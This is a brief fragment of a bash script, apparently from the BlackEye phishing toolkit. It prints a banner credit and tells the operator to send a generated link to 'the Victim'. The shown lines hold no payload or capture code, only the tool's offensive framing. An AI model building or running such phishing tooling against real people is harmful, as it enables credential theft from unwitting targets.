...
# Upgraded by: @baraeerriyachy (https://github.com/baraeerriyachy/blackeye)
...
printf "\n"
printf "     \e[101m\e[1;77m::	               BlackEye By @baraeerriyachy                ::\e[0m\n"
printf "\n"
}
...
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m" $link
